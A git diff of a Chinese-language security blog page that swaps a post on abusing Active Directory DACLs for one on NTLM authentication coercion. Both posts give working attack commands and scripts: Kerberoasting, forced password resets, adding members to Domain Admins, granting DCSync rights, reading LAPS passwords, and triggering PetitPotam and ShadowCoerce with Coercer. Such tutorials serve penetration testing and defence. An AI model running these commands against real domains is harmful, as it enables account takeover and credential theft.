@@ -75,30 +75,6 @@
 			</a>
 		  </li>
 		  
-		  <li>
-			<a href="/categories" title="All the categories.">
-			  <i class=""></i>Categories
-			</a>
-		  </li>
-		  
-		  <li>
-			<a href="/tags" title="All the tags.">
-			  <i class=""></i>Tags
-			</a>
-		  </li>
-		  
-		  <li>
-			<a href="/about" title="About me.">
-			  <i class=""></i>About
-			</a>
-		  </li>
-		  
-		  <li>
-			<a href="/atom.xml" title="Subscribe me.">
-			  <i class=""></i>RSS
-			</a>
-		  </li>
-		  
 		</ul>
       </div>
     </div> <!-- container -->
@@ -137,11 +113,11 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
-			<a href="/2024/12/01/AD-滥用DACL/" >AD-滥用DACL</a>
+			<a href="/2024/12/03/AD-NTLM Relay/" >AD-NTLM Relay</a>
 		</h3>
 		</div>
 	<div class="col-md-4">
-		<div class="date">post @ 2024-12-01  </div>
+		<div class="date">post @ 2024-12-03  </div>
 		</div>
 	</div>
 	
@@ -151,444 +127,115 @@
   <div class="row">
 	
 	
-		<p>很多命令可以在bloodhound的文档上查找：</p>
-<p><a target="_blank" rel="noopener" href="https://support.bloodhoundenterprise.io/hc/en-us/articles/17222775975195-WriteSPN">https://support.bloodhoundenterprise.io/hc/en-us/articles/17222775975195-WriteSPN</a></p>
-<h1><span id="target-kerberoasting">Target Kerberoasting</span></h1><p>Kerberoasting是一种后期利用攻击，利用了Active Directory中服务主体名称（SPN）用于身份验证的方式。当客户端请求Kerberos TGS（服务票证）时，它会用服务账户的NTLM密码哈希对票证进行加密。攻击者可以获取这个票证，并进行离线密码破解。如果破解成功，攻击者就可以获取服务账户的密码。该攻击的成功与否取决于服务账户密码的强度。</p>
-<p>当攻击者拥有能够编辑域中其他用户账户的servicePrincipalName属性的权限时，他们可以使该账户成为Kerberoasting攻击的潜在目标。通过向用户账户添加SPN，攻击者可以请求该SPN的Kerberos TGS服务票证并获取它，该票证会使用用户账户的NTLM密码哈希进行加密。攻击者随后可以使用离线密码破解技术来尝试破解该票证并获取用户账户的密码。</p>
-<p>这种情况发生在受控账户对目标账户拥有GenericAll、GenericWrite、WriteProperty、WriteSPN或Validated-SPN权限时。</p>
-<h2><span id="查看是否有修改目标用户的spn的权限">查看是否有修改目标用户的SPN的权限</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains python3 dacledit.py -principal a -target b -action <span class="built_in">read</span> -dc-ip 192.168.1.1 123.com/a:<span class="string">&#x27;123&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/31.png" alt="31"></p>
-<h2><span id="为受控账户申请st也可以直接用ticketer制作">为受控账户申请ST（也可以直接用ticketer制作）</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains impacket-getST -spn ldap/dc.123.com -hashes :1231231231231231231 <span class="string">&#x27;123.com/a&#x27;</span> -dc-ip 192.168.1.1</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/32.png" alt="32"></p>
-<h2><span id="向目标账户添加spn">向目标账户添加spn</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains python3 addspn.py -u 123.com\\a -t b -T samname -s http/123.123.com -k dc.123.com</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/33.png" alt="33"></p>
-<h2><span id="获取票据进行破解">获取票据进行破解</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains impacket-GetUserSPNs -hashes :123123123123 123.com/a -dc-ip 172.16.102.254 -request-user b</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/34.png" alt="34"></p>
-<h2><span id="删除之前添加的spn">删除之前添加的SPN</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains python3 ./krbrelayx/addspn.py -u 123.com\\a -t b -T samname -s http/123.123.com -r -k dc.123.com</span><br></pre></td></tr></table></figure>
-
-<h1><span id="addmember">AddMember</span></h1><p>当攻击者控制一个具有编辑某个组成员属性权限的特权用户账户时，他们可以将新用户添加到该组中。此攻击&#x2F;滥用行为在受控账户具有 GenericAll、GenericWrite、Self、AllExtendedRights 或 Self-Membership 权限时是可能的。</p>
-<h2><span id="查询当前控制账户对目标的权限">查询当前控制账户对目标的权限</span></h2><h3><span id="查询objectacetypepowerview">查询ObjectAceType（powerview）</span></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$userSID</span> = (<span class="built_in">Get-DomainUser</span> <span class="literal">-Identity</span> <span class="number">123</span> <span class="literal">-server</span> dc.<span class="number">123</span>.com).objectsid</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainObjectACL</span> <span class="string">&quot;Domain Admins&quot;</span> <span class="literal">-server</span> dc.<span class="number">123</span>.com| <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.securityidentifier <span class="operator">-eq</span> <span class="variable">$usersid</span>&#125; | <span class="built_in">select-object</span> ObjectAceType</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/35.png" alt="35"></p>
-<h3><span id="解析该guid">解析该guid</span></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$guid</span> = <span class="string">&quot;bf9679c0-0de6-11d0-a285-00aa003049e2&quot;</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ADObject</span> <span class="literal">-server</span> dc.<span class="number">123</span>.com <span class="literal">-SearchBase</span> <span class="string">&quot;CN=Extended-Rights,<span class="variable">$</span>((Get-ADRootDSE -server dc.123.com).ConfigurationNamingContext)&quot;</span> <span class="literal">-Filter</span> &#123;ObjectClass <span class="operator">-like</span> <span class="string">&#x27;ControlAccessRight&#x27;</span>&#125; <span class="literal">-Properties</span> * |<span class="built_in">Select</span> Name,DisplayName,DistinguishedName,rightsGuid| ?&#123;<span class="variable">$_</span>.rightsGuid <span class="operator">-eq</span> <span class="variable">$guid</span>&#125;| <span class="built_in">fl</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/36.png" alt="36"></p>
-<p>可以看到该账户可以将自己添加到目标组</p>
-<h2><span id="将自己添加到目标组">将自己添加到目标组</span></h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Add-ADGroupMember</span> <span class="literal">-server</span> dc.<span class="number">123</span>.com <span class="literal">-Identity</span> <span class="string">&quot;Domain Admins&quot;</span> <span class="literal">-Members</span> <span class="string">&quot;pallavid&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h1><span id="password-abuse">Password Abuse</span></h1><p>滥用密码是访问系统和数据最常见的攻击手段之一。 DACL 可被用来滥用密码安全，尤其是当我们访问特权账户时。本节将探讨不同类型的 DACL（错误）配置如何导致密码滥用攻击及其对系统安全的影响。</p>
-<p>具体来说，我们将深入探讨滥用以下 DACL 权限：</p>
+		<h1><span id="authentication-coercion">Authentication Coercion</span></h1><p>能够出现像强制身份认证这样的技术的根本原因是Windows 系统在尝试访问像 <code>\\172.16.117.30\file.txt</code> 这样的 UNC 路径时，会自动向其他计算机进行身份验证</p>
+<h2><span id="ms-efsr-abuse-petitpotam">MS-EFSR abuse (PetitPotam)</span></h2><h3><span id="理论">理论</span></h3><p><strong>MS-EFSR</strong> 是微软的加密文件系统远程协议（Encrypting File System Remote Protocol）。它执行对远程存储并通过网络访问的加密数据的维护和管理操作（来源：docs.microsoft.com），并作为一个 RPC 接口提供。该接口可以通过以下 SMB 命名管道访问：<code>\\pipe\\efsrpc</code>、<code>\\pipe\\lsarpc</code>、<code>\\pipe\\samr</code>、<code>\\pipe\\lsass</code> 和 <code>\\pipe\\netlogon</code>。MS-EFSR 滥用可以与 WebClient 滥用结合，诱导通过 HTTP 进行的传入身份验证，从而增强 NTLM 中继攻击的能力。</p>
+<p>以下是 MS-EFSR 方法存在的漏洞点：</p>
 <ul>
-<li><strong>ReadLAPSPassword</strong></li>
-<li><strong>ForceChangePassword</strong></li>
-<li><strong>ReadGMSAPassword</strong></li>
+<li><strong>EfsRpcEncryptFileSrv</strong>、<strong>EfsRpcDecryptFileSrv</strong>、<strong>EfsRpcQueryUsersOnFile</strong>、<strong>EfsRpcQueryRecoveryAgents</strong>、<strong>EfsRpcRemoveUsersFromFile</strong>、<strong>EfsRpcAddUsersToFile</strong>、<strong>EfsRpcFileKeyInfo</strong>、<strong>EfsRpcDuplicateEncryptionInfoFile</strong>、<strong>EfsRpcAddUsersToFileEx</strong>（部分已经被修复了）</li>
 </ul>
-<p>通过滥用这些权限，我们可以重置其他账户的密码，或者读取本地和域账户的密码。</p>
-<h2><span id="forcechangepassword">ForceChangePassword</span></h2><p>User-Force-Change-Password 是一种扩展访问权限，允许用户重置其他账户的密码，包括那些具有更高权限的账户。</p>
-<p>如果我们控制一个能够修改其他用户密码的账户，我们就可以通过更改密码有效地接管该用户的账户；这只有在被控制账户拥有某些访问权限时才可能实现，例如 GenericAll、AllExtendedRights 或 User-Force-Change-Password，并且这些权限允许被控制账户在不需要额外身份验证或授权的情况下修改目标账户的密码。</p>
-<h3><span id="查询objectacetypepowerview">查询ObjectAceType（powerview）</span></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$userSID</span> = (<span class="built_in">Get-DomainUser</span> <span class="literal">-Identity</span> <span class="number">123</span> <span class="literal">-server</span> dc.<span class="number">123</span>.com).objectsid</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainObjectACL</span> <span class="string">&quot;administrator&quot;</span> <span class="literal">-server</span> dc.<span class="number">123</span>.com| <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.securityidentifier <span class="operator">-eq</span> <span class="variable">$usersid</span>&#125; | <span class="built_in">select-object</span> ObjectAceType</span><br></pre></td></tr></table></figure>
+<h3><span id="利用">利用</span></h3><p>使用netexec探测漏洞是否存在</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains netexec smb 192.168.1.1 -u 123 -p 123 -M petitpotam</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/37.png" alt="37"></p>
-<h3><span id="解析该guid">解析该guid</span></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$guid</span> = <span class="string">&quot;00299570-246d-11d0-a768-00aa006e0529&quot;</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ADObject</span> <span class="literal">-server</span> dc.<span class="number">123</span>.com <span class="literal">-SearchBase</span> <span class="string">&quot;CN=Extended-Rights,<span class="variable">$</span>((Get-ADRootDSE -server dc.123.com).ConfigurationNamingContext)&quot;</span> <span class="literal">-Filter</span> &#123;ObjectClass <span class="operator">-like</span> <span class="string">&#x27;ControlAccessRight&#x27;</span>&#125; <span class="literal">-Properties</span> * |<span class="built_in">Select</span> Name,DisplayName,DistinguishedName,rightsGuid| ?&#123;<span class="variable">$_</span>.rightsGuid <span class="operator">-eq</span> <span class="variable">$guid</span>&#125;| <span class="built_in">fl</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/22.png" alt="22"></p>
+<p>使用Coercer触发强制认证</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains python3 Coercer.py coerce --auth-type smb --filter-method-name EfsRpcDecryptFileSrv -u &#x27;123&#x27; -p &#x27;123&#x27; -d 123.com -t 123.123.com -l 1234.1234.com</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/38.png" alt="38"></p>
-<h3><span id="修改密码">修改密码</span></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Set-DomainUserPassword</span> <span class="literal">-Identity</span> administrator <span class="literal">-AccountPassword</span> <span class="variable">$</span>((<span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;NewpasswordfromW1&#x27;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span>)) <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
-
-<h2><span id="readlapspassword">ReadLAPSPassword</span></h2><p>微软的本地管理员密码解决方案（LAPS）使公司能够更好地管理本地管理员密码：与本地管理员之间共享密码（这是常见的情况）不同，LAPS 提供了一种简单的方法，生成具有随机和加密强度的本地管理员密码，并每 30 天（默认为）轮换一次。LAPS 允许在域加入的计算机上管理本地管理员密码（随机化、唯一且定期更改）。这些密码集中存储在 Active Directory 中，并通过访问控制列表（ACL）限制授权用户的访问。密码通过 Kerberos v5 和 AES 在客户端与服务器之间传输时得到保护。其工作原理如下：</p>
+<p><img src="/images/22-1.png" alt="22-1"></p>
+<h2><span id="ms-fsrvp-abuse-shadowcoerce">MS-FSRVP abuse (ShadowCoerce)</span></h2><h3><span id="理论">理论</span></h3><p><strong>MS-FSRVP</strong> 是微软的文件服务器远程 VSS 协议（File Server Remote VSS Protocol）。它用于在远程计算机上创建文件共享的影像副本，并协助备份应用程序执行应用程序一致性的备份和数据恢复，特别是在 SMB2 共享上（来源：docs.microsoft.com）。该接口可以通过 <code>\pipe\FssagentRpc</code> SMB 命名管道访问。</p>
+<p>与其他 MS-RPC 滥用类似，这种攻击方法是通过使用依赖于远程 UNC 路径的特定方法来实现的。MS-FSRVP 滥用似乎无法与 WebClient 滥用结合来诱导通过 HTTP 进行的传入身份验证。滥用的前提条件是目标服务器上必须启用 <strong>“文件服务器 VSS 代理服务”</strong>。</p>
+<p><img src="/images/23.png" alt="23"></p>
+<p>目前已知的利用接口：</p>
 <ul>
-<li>每台计算机上安装一个 LAPS 客户端，负责定期更改计算机的本地管理员密码。</li>
-<li>密码作为计算机对象的属性存储在 Active Directory 中，属性名为 <strong>ms-MCS-AdmPwd</strong>。</li>
-<li>若要访问计算机的本地管理员密码，可以使用工具或 PowerShell 从 Active Directory 检索当前密码。密码仅对被授予读取权限的用户可见。</li>
+<li><strong>IsPathShadowCopied</strong>、<strong>IsPathShadowCopiedResponse</strong>、<strong>IsPathSupported</strong>、<strong>IsPathSupportedResponse</strong></li>
 </ul>
-<h3><span id="获取当前用户可以读取到的所有laps密码">获取当前用户可以读取到的所有LAPS密码</span></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="built_in">Get-DomainComputer</span> <span class="literal">-Properties</span> name | <span class="built_in">ForEach-Object</span> &#123;</span><br><span class="line">    <span class="variable">$computer</span> = <span class="variable">$_</span>.name</span><br><span class="line">    <span class="variable">$obj</span> = <span class="built_in">Get-DomainObject</span> <span class="literal">-Identity</span> <span class="variable">$computer</span> <span class="literal">-Properties</span> <span class="string">&quot;ms-mcs-AdmPwd&quot;</span>, name <span class="literal">-ErrorAction</span> SilentlyContinue</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$obj</span>.<span class="string">&#x27;ms-mcs-AdmPwd&#x27;</span>)&#123;</span><br><span class="line">        <span class="built_in">Write-Output</span> <span class="string">&quot;<span class="variable">$computer</span>`: <span class="variable">$</span>(<span class="variable">$obj</span>.&#x27;ms-mcs-AdmPwd&#x27;)&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>2022年6月，微软在KB5014692中修复了CVE-2022-30154漏洞，同时也修复了此强制攻击。</p>
+<h3><span id="利用">利用</span></h3><p>使用netexec探测漏洞是否存在</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains netexec smb 192.168.1.1 -u 123 -p 123 -M shadowcoerce</span><br></pre></td></tr></table></figure>
 
-<h2><span id="readgmsapassword">ReadGMSAPassword</span></h2><p>组托管服务帐户（gMSA）是 Microsoft Active Directory 中的一个功能，提供了一种安全且自动化的机制，用于管理 Windows 服务器上应用程序和服务使用的服务帐户。与常规服务帐户不同，gMSA 具有内置的密码管理和简化的密钥分发功能，消除了手动管理和更新密码的需要。</p>
-<p>当创建 gMSA 时，它会与特定的 Active Directory 组相关联，允许多个服务器或应用程序共享同一个 gMSA 进行身份验证。这种关联简化了跨多个系统的服务帐户的管理和维护。</p>
-<p>gMSA 利用安全的密钥分发过程，密码由 Active Directory 域控制器自动生成、 存储并定期轮换。这消除了密码被泄露或遗忘的风险，降低了攻击面并增强了安全性。</p>
-<p>通过使用 gMSA，相关的主体（如计算机帐户、服务器或应用程序）可以通过存储在服务帐户的 msDS-GroupMSAMembership 属性中的专用 DACLs 授予特定的访问权限。这些访问权限可以根据每个主体的具体需求进行定制，授予它们访问必要资源的权限，并减少手动管理权限的需求。</p>
-<p>如果我们获得了具有使用 gMSA 权限的主体（如计算机帐户、服务器或应用程序）的访问权限，我们可以利用它来获取组管理服务帐户的密码。</p>
-<h3><span id="使用gmsapasswordreader获取密码">使用GMSAPasswordReader获取密码</span></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Tools&gt; GMSAPasswordReader.exe <span class="literal">--accountname</span> apache<span class="literal">-dev</span></span><br></pre></td></tr></table></figure>
+<p>使用Coercer触发强制认证</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains python3 Coercer.py coerce --auth-type smb --filter-method-name IsPathShadowCopied -u <span class="string">&#x27;123&#x27;</span> -p <span class="string">&#x27;123&#x27;</span> -d 123.com -t 123.123.com -l 1234.1234.com</span><br></pre></td></tr></table></figure>
 
-<h1><span id="granting-rights-and-ownership">Granting Rights and Ownership</span></h1><p>在Active Directory的上下文中，特定的权限，如 WriteDacl 和 Ownership，在控制对象访问和确保其安全性方面起着至关重要的作用。</p>
-<p>WriteDacl 访问权限指允许一个账户修改目标对象的 DACL（访问控制列表）。而 Ownership 则表示对对象拥有管理控制的状态。理解这些访问权限的意义至关重要，因为它们会影响被操作的 DACL 的脆弱性以及潜在的滥用风险。</p>
-<p>假设我们拥有一个账户，该账户拥有通过 WriteDacl 访问权限修改目标对象所有权或 DACL 的权限。在这种情况下，我们可以使用该账户编辑目标对象的 DACL，使其容易受到其他攻击。</p>
-<h2><span id="writedacl">WriteDacl</span></h2><h3><span id="查询目标用户是否存在writedacl权限">查询目标用户是否存在WriteDacl权限</span></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$sid</span> = (<span class="built_in">Get-DomainUser</span> <span class="literal">-Identity</span> <span class="number">123</span> <span class="literal">-server</span> dc.<span class="number">123</span>.com).objectsid</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainSID</span> <span class="literal">-server</span> dc.<span class="number">123</span>.com| <span class="built_in">Get-DomainObjectAcl</span> <span class="literal">-server</span> dc.<span class="number">123</span>.com | ?&#123;<span class="variable">$_</span>.SecurityIdentifier <span class="operator">-eq</span> <span class="variable">$sid</span>&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/39.png" alt="39"></p>
-<h3><span id="添加dcsync权限">添加Dcsync权限</span></h3><p>通过添加下面三条扩展权限来实现：<br>DS-Replication-Get-Changes-In-Filtered-Set<br>DS-Replication-Get-Changes<br>DS-Replication-Get-Changes-All</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Add-DomainObjectAcl</span> <span class="literal">-server</span> dc.<span class="number">123</span>.com <span class="literal">-TargetIdentity</span> <span class="variable">$</span>(<span class="built_in">Get-DomainSID</span> <span class="literal">-server</span> dc.<span class="number">123</span>.com) <span class="literal">-PrincipalIdentity</span> luna <span class="literal">-Rights</span> DCSync <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/40.png" alt="40"></p>
-<h2><span id="grant-ownership">Grant ownership</span></h2><p>我们获得了对一个目标对象的 WriteOwner 访问权限。这个特定的账户允许我们修改目标对象的所有者，具体来说，是修改对象 security descriptor 中的 OwnerSid 子属性。利用这个 访问权限 会打开多种滥用的可能性，具体取决于目标对象的类型：如果我们对 用户 拥有 WriteOwner 权限，我们可以将所有权授予另一个账户（这将使我们能够执行 密码重置 或 targeted Kerberoasting）；如果是 组，我们可以添加或删除成员；如果是 GPO（组策略对象），我们可以进行修改。</p>
-<p>WriteOwner 访问权限允许我们修改对象的所有者；然而，当使用 dacledit.py 或 PowerView 时，这些工具不会显示任何可以滥用的访问权限。例如，Lilia 是 Managers 组的所有者，如果我们使用 PowerView 或 dacledit.py 来查看该对象的 DACL，我们将不会得到任何结果。</p>
-<h3><span id="添加writeowner权限的脚本">添加WriteOwner权限的脚本</span></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 指定特定域控的 LDAP 路径</span></span><br><span class="line"><span class="variable">$domainController</span> = <span class="string">&quot;LDAP://dc.123.com&quot;</span></span><br><span class="line"><span class="variable">$groupDN</span> = <span class="string">&quot;CN=Domain Admins,CN=Users,DC=123,DC=com&quot;</span>   <span class="comment"># 替换为目标组的 LDAP 路径</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显式连接到指定域控</span></span><br><span class="line"><span class="variable">$groupADSI</span> = [<span class="type">ADSI</span>]<span class="string">&quot;<span class="variable">$domainController</span>/<span class="variable">$groupDN</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SID 字符串（目标用户的 SID）</span></span><br><span class="line"><span class="variable">$sid</span> = (<span class="built_in">get-Domainuser</span> <span class="literal">-identity</span> pallavid <span class="literal">-server</span> CtrlsADC12.vensec.com).objectsid</span><br><span class="line"><span class="variable">$identityReference</span> = <span class="built_in">New-Object</span> System.Security.Principal.SecurityIdentifier(<span class="variable">$sid</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 ActiveDirectoryAccessRule 对象</span></span><br><span class="line"><span class="variable">$ACE</span> = <span class="built_in">New-Object</span> System.DirectoryServices.ActiveDirectoryAccessRule(</span><br><span class="line">    <span class="variable">$identityReference</span>,                                               <span class="comment"># IdentityReference: SecurityIdentifier 对象</span></span><br><span class="line">    [<span class="type">System.DirectoryServices.ActiveDirectoryRights</span>]::WriteOwner,      <span class="comment"># 权限: WriteOwner</span></span><br><span class="line">    [<span class="type">System.Security.AccessControl.AccessControlType</span>]::Allow          <span class="comment"># 访问控制类型: Allow</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取现有的 ObjectSecurity（权限信息）</span></span><br><span class="line"><span class="variable">$objectSecurity</span> = <span class="variable">$groupADSI</span>.psbase.ObjectSecurity</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将新的 ACE 添加到现有的 ObjectSecurity</span></span><br><span class="line"><span class="variable">$objectSecurity</span>.AddAccessRule(<span class="variable">$ACE</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交更改</span></span><br><span class="line"><span class="variable">$groupADSI</span>.psbase.ObjectSecurity = <span class="variable">$objectSecurity</span></span><br><span class="line"><span class="variable">$groupADSI</span>.psbase.CommitChanges()</span><br></pre></td></tr></table></figure>
-
-<h1><span id="shadow-credentials">Shadow Credentials</span></h1><p>Shadow Credentials 是一种替代的用户和计算机账户接管技术，它利用了 Windows Hello for Business 的密码免认证功能。它通过将 Key Credentials 添加到目标用户&#x2F;计算机账户的 msDS-KeyCredentialLink 属性，然后使用 PKINIT 执行 Kerberos 认证，从而接管该账户。与 密码重置 或 Roasting（针对用户）以及 Kerberos 预认证 或 RBCD（针对计算机）等原始技术相比，这种方法更加简单和可靠。</p>
-<h2><span id="kerberos-pre-authentication">Kerberos Pre-Authentication</span></h2><p>在 Active Directory 域中，Kerberos 认证过程 依赖于一个叫做 预认证（pre-authentication）的初步步骤。预认证的目的是防止 离线攻击，例如 AS-REP Roasting，其中任何人都可以使用客户端密码派生的密钥获取加密的 Blob 并尝试破解它。为了证明身份，客户端必须使用自己的密钥加密当前时间戳，这个密钥是通过客户端的密码（DES、RC4、AES128 或 AES256）派生出来的，然后将加密后的时间戳发送到 KDC（密钥分发中心）。如果 KDC 能解密该时间戳，就说明客户端使用了正确的密码派生密钥，因为 KDC 拥有域中所有密码派生的密钥。</p>
-<p>当 预认证 成功通过时，认证的客户端将会收到 TGT（票证授予票证），使得该客户端能够请求更多的票证，从而连接到网络中的其他服务。</p>
-<p><img src="/images/41.png" alt="41"></p>
-<p>然而，确实存在一个使用场景，其中并不使用密码派生的密钥，且 预认证 过程是非对称执行的。这个场景被称为 公钥密码学初始认证（PKINIT），它允许用户在配置了 PKI（公钥基础设施）的 Active Directory 域中，使用 x509 证书获取 TGT。值得注意的是，AD CS（Active Directory 证书服务）是微软的 PKI 实现。</p>
-<p><img src="/images/42.png" alt="42"></p>
-<p>PKINIT 协议 是一种安全协议，使用公钥密码学对网络上的实体进行身份验证。PKINIT 是一个 预认证扩展，它扩展了 Kerberos 协议，使其在初始 AS 交换期间使用公钥密码学和票据授权票证（TGT）数据签名。该协议在 [RFC4556] 中进行了规范，但微软对 Windows 上的 PKINIT 实现做了一些修改，这些修改与 [RFC4556] 略有不同，可以在 [MS-PKCA] 中找到：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pkca/d0cf1763-3541-4008-a75f-a577fa5e8c5b">Kerberos 协议中的公钥密码学初始认证（PKINIT）</a>。</p>
-<h2><span id="passwordless-authentication">Passwordless authentication</span></h2><p>微软在 Windows Server 2016 中引入了 Key Trust 的概念，以支持在不支持 Certificate Trust 的环境中进行无密码认证。通过 Key Trust，PKINIT 认证使用存储在 Active Directory 对象属性 msDS-KeyCredentialLink 中的原始密钥数据，而不是证书。</p>
-<p>客户端的公钥存储在多值属性 msDS-KeyCredentialLink 中。该属性的值是 Key Credentials，这些是序列化对象，包含诸如创建日期、所有者的 Distinguished Name、表示设备 ID 的 GUID，以及公钥等信息。它是一个多值属性，因为一个帐户可以关联多个设备。</p>
-<p>我们可以使用 PowerView 查询 msDS-KeyCredentialLink 属性不为空的用户&#x2F;计算机：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomainUser</span> <span class="literal">-Filter</span> <span class="string">&#x27;(msDS-KeyCredentialLink=*)&#x27;</span> <span class="literal">-server</span> dc.<span class="number">123</span>.com</span><br><span class="line"><span class="built_in">Get-DomainComputer</span> <span class="literal">-Filter</span> <span class="string">&#x27;(msDS-KeyCredentialLink=*)&#x27;</span> <span class="literal">-server</span> dc.<span class="number">123</span>.com</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/43.png" alt="43"></p>
-<p>该属性包含密钥凭证（Key Credentials），它们是序列化的对象，包含诸如创建日期、所有者的区分名称、表示设备 ID 的 GUID 以及当然还有公钥等信息。由于一个帐户可以有多个关联的设备，msDS-KeyCredentialLink 是一个多值属性。</p>
-<p>微软的无密码解决方案称为 Windows Hello for Business (WHfB)。当用户注册时，TPM 为其帐户生成一对公钥和私钥。私钥存储在 TPM 中并永远不会离开。假设组织已实施 证书信任 模型，在这种情况下，客户端会发出证书请求，以便从环境中的证书颁发机构获取与 TPM 生成的密钥对关联的受信证书。</p>
-<p>另一方面，如果实施了 密钥信任 模型，则公钥将存储在帐户的 msDS-KeyCredentialLink 属性中的新 密钥凭证对象 中。私钥由 PIN 码 保护，此外，还可以通过 Windows Hello 使用生物识别认证因素（如指纹或面部识别）替代。</p>
-<p>当客户端登录时，Windows 尝试使用其私钥执行 PKINIT 认证。在 密钥信任 模型下，域控制器可以使用存储在客户端 msDS-KeyCredentialLink 属性中的相应对象中的原始公钥解密其预认证数据。</p>
